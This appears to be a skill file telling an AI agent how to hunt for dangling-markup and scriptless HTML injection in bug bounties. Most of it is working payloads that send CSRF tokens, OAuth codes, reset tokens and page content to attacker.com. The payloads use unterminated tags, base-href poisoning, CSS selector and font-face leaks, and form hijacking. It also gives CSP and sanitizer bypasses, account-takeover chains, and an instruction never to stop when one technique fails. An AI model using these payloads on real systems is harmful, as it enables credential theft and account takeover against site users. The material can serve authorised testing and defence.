---
name: hunt-dangling-markup
description: "Use this skill when reflected HTML injection is confirmed but JS execution is blocked — strict CSP (`script-src 'self'`), browser XSS filters, sanitizer strips event handlers but allows tags, sandbox iframe, or any case where you can inject HTML but not script. Load automatically when you see user input rendered in HTML context with CSP that blocks inline/external script. Only invoke if real impact potential exists — exfiltrating CSRF tokens, session info, or PII via scriptless injection. A reflected `<b>` with no exfil channel is not a bounty."
type: hunt
---

# Hunt: DANGLING MARKUP / SCRIPTLESS HTML INJECTION

When XSS is blocked but HTML injection works, you can still exfiltrate sensitive data (CSRF tokens, page content, secrets in DOM) using unterminated tags, CSS, and HTML forms.

## Crown Jewel Targets
- Pages containing CSRF tokens (`<input name="_csrf" value="...">`) — steal token → CSRF chain
- OAuth/SAML callback pages with `code=` or `SAMLResponse` in DOM
- Account settings pages with email/phone (PII exfil)
- API key display pages (one-time-view tokens)
- Admin pages with user enumeration
- Anti-CSRF synchronizer tokens in meta tags

## Detection Signals
- Reflected input in HTML context (between tags, not just text node)
- Response includes `Content-Security-Policy: ... script-src 'self'` (no `'unsafe-inline'`)
- Sanitizer strips `<script>`, `onerror=`, `onload=` but allows other tags
- Sandboxed iframe (`sandbox` without `allow-scripts`)
- DOMPurify with restrictive profile
- Test injection: `<plaintext>` — if rest of page becomes plain text, you have HTML control

## Attack Techniques

### 1. Unterminated `src` / `href` — classic dangling
Browser sees `<img src='https://evil/?` and consumes everything until the next matching quote, sending DOM content to attacker.
```html
<img src='https://attacker.com/log?
<!-- everything from here until the next ' in the page gets sent in the URL -->
```
Variant — base/link/script src:
```html
<base href='//attacker.com/'>
<link rel=stylesheet href='//attacker.com/x?
```

### 2. `<textarea>` / `<noscript>` / `<style>` / `<title>` — content swallowers
These elements treat everything inside as raw text. Inject opening tag, swallow rest of page, exfil via form action.
```html
<textarea>
<!-- rest of page captured -->
</textarea><form action=https://attacker.com method=POST><input name=x value="
<!-- closes the previous attribute, content goes into value= -->
```

### 3. `<base href=>` poisoning
Change all relative URLs (including form actions, link hrefs, image srcs) to point at attacker.
```html
<base href='https://attacker.com/'>
<!-- now <form action="/login"> posts to attacker.com/login -->
```

### 4. CSS exfiltration — attribute selectors
Leak attribute values character-by-character using `[name^="a"]` style rules.
```html
<style>
input[name="csrf"][value^="a"]{background:url(//attacker.com/log?c=a)}
input[name="csrf"][value^="b"]{background:url(//attacker.com/log?c=b)}
/* ...one rule per char... */
</style>
```
Recursive: after first char known, send second-char rules. ~1 round-trip per character.

### 5. CSS @font-face unicode-range exfil
Each character of leaked text triggers a different font download.
```html
<style>
@font-face{font-family:x;src:url(//attacker.com/?c=A);unicode-range:U+0041}
@font-face{font-family:x;src:url(//attacker.com/?c=B);unicode-range:U+0042}
/* ... */
* { font-family: x !important }
</style>
```
Forces browser to fetch a different URL for every unique character rendered on the page.

### 6. CSS attribute-selector + background-image (token-level)
```html
<style>
form#login input[name="csrf"][value$="aZ9k"] {
  background: url(https://attacker.com/got/aZ9k);
}
</style>
```
Combined with timing/oracle to enumerate full token.

### 7. Form hijacking
Inject form that engulfs existing inputs.
```html
<form action='https://attacker.com/steal' method=POST id=evil>
<!-- any subsequent <input> in the page belongs to this form now -->
<!-- victim clicks ANY submit button anywhere in DOM → posts to attacker -->
```
Variant — change action of existing form:
```html
" formaction='https://attacker.com'                  ← if reflection is in button/input attr
```

### 8. `<meta http-equiv="refresh">` — redirect exfil
```html
<meta http-equiv="refresh" content="0;url=https://attacker.com/?c=<!-- can't include page content directly, but chain with base href -->">
```

### 9. `<link rel=prefetch>` / `rel=dns-prefetch` / `rel=preload`
Forces fetch — useful for blind detection or beaconing.
```html
<link rel=dns-prefetch href=//attacker.com>
<link rel=preload href=//attacker.com/x as=image>
```

### 10. Scroll-to-text fragment leak (modern browsers)
```html
<iframe src="https://target/profile#:~:text=secret"></iframe>
```
Combined with timing/observation, leaks whether substring exists in page (oracle for token brute-force on chrome).

### 11. SVG with foreignObject (when SVG allowed, script blocked)
```html
<svg><foreignObject><iframe src='https://attacker.com?
```

### 12. Form action + autofocus button (zero-click)
```html
<form action=https://attacker.com><button autofocus formaction=https://attacker.com>x</button>
```
Browser autofocus + Enter key → exfil (limited but works in some flows).

## Payloads
```html
<!-- Drop-in test payloads -->
<plaintext>                                                 <!-- detect HTML control -->
<img src='https://OAST/?
<base href=https://attacker.com/>
<base target=_blank>
<form action=https://attacker.com>
<style>@import url(https://attacker.com/x.css)
<link rel=stylesheet href=https://attacker.com/x>
<textarea>
<noscript><img src='https://attacker.com/?
<iframe src='https://attacker.com?
<meta http-equiv=refresh content=0;url=//attacker.com>
<svg><animate onbegin=alert(1)>                              <!-- if SVG event handlers slip through CSP -->

<!-- CSP-aware exfil — works with script-src 'self' if connect-src allows * -->
<link rel=preconnect href=//attacker.com>
<link rel=dns-prefetch href=//attacker.com>
```

## Bypass Methods
| Defense | Bypass |
|---------|--------|
| CSP `script-src 'self'` | Use CSS exfil, HTML form hijack, dangling markup — all scriptless |
| CSP `default-src 'self'` (incl. img/style) | Use `<base>` to redirect form actions, or `prefetch` to whitelisted CDN under attacker control |
| Sanitizer strips `<img src=` | Use `<base href=...>`, `<link rel=stylesheet href=...>`, `<form action=...>`, `<iframe srcdoc=...>` |
| Strips quotes | Use backtick attr quotes (IE) or unquoted attrs: `<img src=//evil>` |
| Strips `<` and `>` | Use HTML entities `&lt;` if the sink decodes them (rare but real for textarea reflections) |
| Sandbox iframe | `<base>` still works inside sandbox; `allow-popups` enables form exfil |
| Trusted Types | CSS-only attacks unaffected |
| CSP with `connect-src 'none'` | Use `<link rel=prefetch>` (often gated by different directive — prefetch-src), or form submission (form-action) |

## Tools
```bash
# Manual — Burp Repeater + custom payloads from PayloadsAllTheThings/HTML Injection/

# DOMPurify bypass list (kept updated)
# https://github.com/cure53/DOMPurify/wiki

# Headless validation
playwright screenshot https://target/?q=<dangling-payload>

# CSS exfil PoC server
python3 -m http.server 8000   # log incoming GETs as exfil channel
```

## Impact
- **High to Critical** — CSRF token exfil chained with state-changing CSRF (account takeover, fund transfer)
- **High** — exfil of secrets visible in DOM (API keys, OAuth codes, password reset tokens)
- **Medium** — partial DOM content leak (page metadata, user email)
- **Not a finding** — HTML reflection with no sensitive DOM content and no exfil channel proven

## Chain Potential
- Dangling markup → steal CSRF token → CSRF → account takeover
- Dangling markup → steal OAuth `code` from callback DOM → ATO
- `<base href=attacker>` → form action hijack → credential theft (when user submits login)
- CSS exfil of 2FA seed displayed on setup page → MFA bypass (hunt-mfa-bypass)
- Dangling markup on password-reset page → steal reset token → ATO
- Combined with HTML injection in emails (hunt-content-injection) → exfil from email client preview

## Fallback Chain
1. If `<script>` blocked by sanitizer, try non-script tags — `<img src=>`, `<base href=>`, `<form action=>`, `<link>`, `<meta refresh>`.
2. If unterminated quote/src is closed by sanitizer, try content-swallowing tags (`<textarea>`, `<noscript>`, `<plaintext>`, `<style>`) to engulf the rest of the page.
3. If all HTML tags filtered, try CSS-only exfil via attribute selectors and @font-face unicode-range — requires only `<style>` or `style=` attribute.
4. If exfil channel is dead (strict `connect-src`), look for whitelisted CDNs under your control (S3 bucket on whitelisted domain, GitHub Pages, allowed-origin reflections). Never stop because one technique failed.
